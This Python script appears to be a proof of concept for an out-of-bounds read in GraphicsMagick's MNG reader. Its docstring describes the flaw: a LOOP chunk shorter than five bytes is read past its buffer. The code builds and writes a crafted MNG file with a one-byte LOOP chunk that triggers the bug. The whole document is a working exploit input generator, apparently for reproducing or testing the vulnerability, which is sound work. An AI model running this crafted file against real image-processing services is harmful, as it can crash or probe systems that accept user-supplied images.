#!/usr/bin/env python3
"""MNG input for GraphicsMagick ReadMNGImage.

mng_get_long reads 4 bytes at chunk[1]. A LOOP chunk shorter than 5 bytes
is allocated to its declared length, so that read runs past the buffer.
The patched image rejects the short chunk.
"""
import argparse
import pathlib
import struct
import zlib


def chunk(tag: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(tag + data) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", crc)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="poc.bin")
    args = ap.parse_args()
    sig = b"\x8aMNG\r\n\x1a\n"
    mhdr = struct.pack(">IIIIIII", 1, 1, 1, 1, 1, 0, 1)
    blob = sig + chunk(b"MHDR", mhdr) + chunk(b"LOOP", b"\x01") + chunk(b"MEND", b"")
    out = pathlib.Path(args.out)
    out.write_bytes(blob)
    print(f"wrote {out} ({out.stat().st_size} bytes) LOOP length 1")


if __name__ == "__main__":
    main()
